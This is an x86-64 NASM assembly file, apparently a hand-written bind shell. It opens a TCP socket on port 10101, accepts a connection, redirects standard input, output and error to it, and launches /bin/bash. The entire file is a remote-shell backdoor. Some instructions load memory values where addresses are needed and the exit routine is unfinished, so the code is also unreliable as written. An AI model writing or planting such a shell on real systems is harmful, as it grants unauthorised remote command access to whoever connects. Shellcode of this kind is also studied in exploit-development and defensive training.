%include 'defs.h'

section .data

	sock dq 0
	fd dq 0
	bash db "/bin/bash", 0
	lenB equ $-bash

section .bss
sin:
	sin_family: DW 0
	sin_port: DW 0
	sin_addr: DW 0
	padding: DW 0

section .text 
	global _start
_start:
	;sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
	mov rax, SYS_SOCKET
	mov rdi, AF_INET
	mov rsi, SOCK_STREAM
	mov rdx, IPPROTO_TCP
	syscall
 
	mov qword [sock], rax

	mov word [sin_family], AF_INET

	mov ax, 10101
	xchg al, ah
	mov word [sin_port], ax		

bind: ;bind(sock, &sin, sizeof(sin))

	mov rax, SYS_BIND
	mov rdi, [sock]
;	mov bl, [sin_family]
;	mov bh, [sin_port]
	mov rsi, [sin]
	mov rdx, 0x10
	syscall

listen: ;listen(sock, 1)
	mov rax, SYS_LISTEN
	mov rdi, [sock]
	mov rsi, 1
	syscall

accept: ;fd = accept(sock, NULL, NULL)
	mov rax, SYS_ACCEPT
	mov rdi, [sock]
	xor rsi, rsi
	xor rdx, rdx
	syscall

	mov qword [fd], rax

dup2_1: ;dup2(fd, stdin)
	mov rax, SYS_DUP2
	mov rdi, [fd]
	mov rsi, STDIN
	syscall

dup2_2: ;dup2(fd, stdout)
	mov rax, SYS_DUP2
	mov rdi, [fd]
	mov rsi, STDOUT
	syscall

dup2_3: ;dup2(fd, stderr)
	mov rax, SYS_DUP2
	mov rdi, [fd]
	mov rsi, STDERR
	syscall

execve: ;execve(bash, NULL, NULL)
	mov rax, SYS_EXECVE
	mov rdi, [bash]
 	xor rsi, rsi
	xor rdx, rdx
	syscall	

;exit:
;	mov 
